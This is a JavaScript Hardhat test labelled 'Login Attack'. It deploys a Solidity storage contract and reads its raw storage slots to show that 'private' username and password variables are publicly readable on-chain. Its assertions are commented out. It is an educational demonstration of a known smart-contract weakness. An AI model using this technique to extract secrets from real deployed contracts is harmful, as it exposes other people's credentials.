const {ethers} = require("hardhat");
const {expect} = require("chai");

describe("Login Attack", function () {
    it("Should be able to read the private variables password and username", async function () {
        // Deploy the login contract
        const loginFactory = await ethers.getContractFactory("Storage");

        // To save space, we would convert the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String("test");
        const passwordBytes = ethers.utils.formatBytes32String("password");
        const loginContract = await loginFactory.deploy();
        await loginContract.deployed();

        // Get the storage at storage slot 0,1
        const slot0Bytes = await ethers.provider.getStorageAt(loginContract.address,0);
        const slot1Bytes = await ethers.provider.getStorageAt(loginContract.address,1);
        const slot2Bytes = await ethers.provider.getStorageAt(loginContract.address,2);
        const slot3Bytes = await ethers.provider.getStorageAt(loginContract.address,3);
        const slot4Bytes = await ethers.provider.getStorageAt(loginContract.address,4);


        console.log("slot0Bytes",slot0Bytes)
        console.log("slot1Bytes",slot1Bytes)
        console.log("slot2Bytes",slot2Bytes)
        console.log("slot3Bytes",slot3Bytes)
        console.log("slot4Bytes",slot4Bytes)

        // We are able to extract the values of the private variables
        // expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
        // expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
    });
});